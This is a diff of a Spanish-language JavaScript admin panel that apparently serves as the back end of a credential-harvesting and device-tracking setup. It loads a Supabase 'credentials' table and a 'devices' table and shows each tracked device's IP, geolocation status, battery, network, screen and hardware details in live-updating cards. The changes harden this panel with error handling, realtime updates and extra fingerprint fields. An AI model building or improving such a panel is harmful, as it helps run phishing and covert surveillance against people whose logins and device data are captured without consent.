@@ -40,7 +40,10 @@ clearTerminalBtn.addEventListener('click', () => {
 
 // Inicializar la data llamando a Supabase directamente
 async function initAdmin() {
-    logToTerminal('Conectando a base de datos segura y Serverless...', 'info');
+    logToTerminal('Iniciando Perímetro de Administración...', 'info');
+    
+    // Configurar suscripciones PRIMERO para que el tiempo real funcione aunque la BD falle
+    setupRealtimeSubscriptions();
 
     try {
         const [devRes, credRes] = await Promise.all([
@@ -48,13 +51,19 @@ async function initAdmin() {
             supaClient.from('credentials').select('*').order('timestamp', { ascending: false }).limit(50)
         ]);
 
-        if (devRes.data) {
+        if (devRes.error) {
+            console.error("Error fetching devices:", devRes.error);
+            logToTerminal(`ERROR DE ACCESO A TABLA DEVICES: ${devRes.error.message}`, 'error');
+        } else if (devRes.data) {
             devices = devRes.data;
             deviceCountEl.textContent = devices.length;
             renderDevices();
         }
 
-        if (credRes.data) {
+        if (credRes.error) {
+            console.error("Error fetching credentials:", credRes.error);
+            logToTerminal(`ERROR DE ACCESO A TABLA CREDENTIALS: ${credRes.error.message}`, 'error');
+        } else if (credRes.data) {
             credentialsData = credRes.data;
             credentialsCount = credentialsData.length;
             credentialsCountEl.textContent = credentialsCount;
@@ -62,7 +71,6 @@ async function initAdmin() {
         }
 
         updateStatsFromDevices();
-        setupRealtimeSubscriptions();
 
         // Actualizar UI cada 30 segundos para limpiar inactivos
         setInterval(() => {
@@ -79,7 +87,13 @@ async function initAdmin() {
 function getActiveDevices() {
     return devices.filter(d => {
         if (!d.last_active) return false;
-        return (Date.now() - new Date(d.last_active).getTime()) < 60000;
+        
+        const lastActiveTime = new Date(d.last_active).getTime();
+        const currentTime = new Date().getTime();
+        
+        // Usamos un margen de 5 minutos (300,000 ms) y Math.abs para ignorar desajustes de reloj
+        // Esto evita que desaparezcan si el reloj del dispositivo está adelantado o atrasado
+        return Math.abs(currentTime - lastActiveTime) < 300000;
     });
 }
 
@@ -113,6 +127,8 @@ function renderDevices() {
         div.className = 'device-card';
         
         const lastActive = new Date(device.last_active).toLocaleTimeString();
+        const loc = device.location || {};
+        const screenRes = device.screen_width ? `${device.screen_width}x${device.screen_height}` : (loc.screen_res || 'N/A');
         
         div.innerHTML = `
             <div class="device-header">
@@ -122,7 +138,7 @@ function renderDevices() {
             
             <div class="device-info">
                 <div class="device-info-item"><strong>IP:</strong> ${device.ip || '0.0.0.0'}</div>
-                <div class="device-info-item"><strong>Ubicación:</strong> ${device.location ? 'GEOLOCALIZADO' : 'PENDIENTE'}</div>
+                <div class="device-info-item"><strong>Ubicación:</strong> ${loc.latitude ? 'GEOLOCALIZADO' : 'PENDIENTE'}</div>
                 <div class="device-info-item"><strong>Plataforma:</strong> ${device.platform}</div>
                 <div class="device-info-item"><strong>Último Pulso:</strong> ${lastActive}</div>
             </div>
@@ -135,12 +151,16 @@ function renderDevices() {
                 <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.8rem;">
                     <div>• OS_PLATFORM: <span style="color: var(--text-main)">${device.platform}</span></div>
                     <div>• IP_V4_ADDR: <span style="color: var(--secondary)">${device.ip || '0.0.0.0'}</span></div>
-                    <div>• GEO_ZONE: <span style="color: var(--text-main)">${device.timezone || 'UTC'}</span></div>
-                    <div>• CPU_CORES: <span style="color: var(--text-main)">${device.cores || 'N/A'}</span></div>
-                    <div>• RAM_ESTIM: <span style="color: var(--text-main)">${device.memory ? device.memory + ' GB' : 'N/A'}</span></div>
-                    <div>• RESOLUTION: <span style="color: var(--text-main)">${device.screen_res || 'N/A'}</span></div>
-                    <div>• COOKIES_EN: <span style="color: var(--text-main)">${device.cookies || 'N/A'}</span></div>
-                    <div>• NET_STATUS: <span style="color: var(--secondary)">${device.online || 'ONLINE'}</span></div>
+                    <div>• GEO_ZONE: <span style="color: var(--text-main)">${loc.timezone || 'UTC'}</span></div>
+                    <div>• CPU_CORES: <span style="color: var(--text-main)">${loc.cores || 'N/A'}</span></div>
+                    <div>• RAM_ESTIM: <span style="color: var(--text-main)">${loc.memory ? loc.memory + ' GB' : 'N/A'}</span></div>
+                    <div>• RESOLUTION: <span style="color: var(--text-main)">${screenRes}</span></div>
+                    <div>• BATT_LEVEL: <span style="color: var(--text-main)">${loc.battery_level || 'N/A'}</span></div>
+                    <div>• CHARGING: <span style="color: var(--text-main)">${loc.battery_charging || 'N/A'}</span></div>
+                    <div>• CONN_TYPE: <span style="color: var(--text-main)">${loc.connection_type || 'N/A'}</span></div>
+                    <div>• DOWNLINK: <span style="color: var(--text-main)">${loc.downlink || 'N/A'}</span></div>
+                    <div>• COOKIES_EN: <span style="color: var(--text-main)">${loc.cookies || 'N/A'}</span></div>
+                    <div>• NET_STATUS: <span style="color: var(--secondary)">${loc.online || 'ONLINE'}</span></div>
                     <div>• MAC_ADDR: <span style="color: var(--error)">[BLOCK_BY_OS]</span></div>
                     <div>• LANG_SET: <span style="color: var(--text-main)">${device.language}</span></div>
                 </div>
@@ -311,20 +331,37 @@ function setupRealtimeSubscriptions() {
                 renderCredentials();
             }
         })
-        .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'devices' }, payload => {
-            const updatedDev = payload.new;
-            const idx = devices.findIndex(d => d.device_id === updatedDev.device_id);
-            if (idx >= 0) devices[idx] = updatedDev;
-            else devices.unshift(updatedDev);
+        .on('postgres_changes', { event: '*', schema: 'public', table: 'devices' }, payload => {
+            if (payload.eventType === 'DELETE') {
+                devices = devices.filter(d => d.device_id !== payload.old.device_id);
+            } else {
+                const updatedDev = payload.new;
+                const idx = devices.findIndex(d => d.device_id === updatedDev.device_id);
+                if (idx >= 0) {
+                    devices[idx] = updatedDev;
+                } else {
+                    devices.unshift(updatedDev);
+                }
+            }
             updateStatsFromDevices();
             renderDevices();
         })
-        .subscribe((status) => {
+        .subscribe((status, err) => {
             if (status === 'SUBSCRIBED') {
-                logToTerminal('Suscripción activa a eventos Postgres / CyberRoom Channels.', 'info');
+                logToTerminal('Conexión Realtime establecida con éxito.', 'success');
+            }
+            if (status === 'CLOSED') {
+                logToTerminal('¡ADVERTENCIA! Conexión Realtime cerrada. Revisa tu API Key o conexión a internet.', 'error');
+            }
+            if (status === 'CHANNEL_ERROR') {
+                logToTerminal('ERROR DE CANAL: No se pudo conectar al servidor de Realtime.', 'error');
+                console.error("Error detallado de canal:", err);
             }
         });
 }
 
 // Inicializar pantalla
-initAdmin();
+initAdmin().catch(err => {
+    console.error(">>> ERROR CRITICO EN ADMIN <<<", err);
+    logToTerminal('Error de sistema: ' + (err.message || 'Error desconocido'), 'error');
+});
